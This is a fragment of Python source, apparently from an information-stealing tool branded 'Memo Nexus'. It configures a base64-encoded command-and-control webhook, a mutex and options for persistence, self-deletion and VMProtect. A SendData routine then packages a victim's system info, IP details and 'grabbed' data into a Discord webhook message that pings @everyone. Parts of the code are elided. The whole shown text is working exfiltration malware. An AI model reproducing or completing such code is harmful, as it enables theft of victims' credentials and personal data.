...
class Settings:
    C2 = (0, base64.b64decode('WEBHOOK_HERE').decode())
    Mutex = base64.b64decode('VzRVdzFOOTRCSUJTT0REeg==').decode()
    PingMe = bool('true')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
    ...
    def SendData(self) -> None:
        ...
        match Settings.C2[0]:
            case 0:
                ...
                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Memo Nexus', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://discord.gg/Q3GVNC4B66', 'color': 34303, 'footer': {'text': 'Grabbed by Memo Nexus | https://discord.gg/Q3GVNC4B66'}, 'thumbnail': {'url': image_url}}], 'username': 'Memo Nexus', 'avatar_url': image_url}
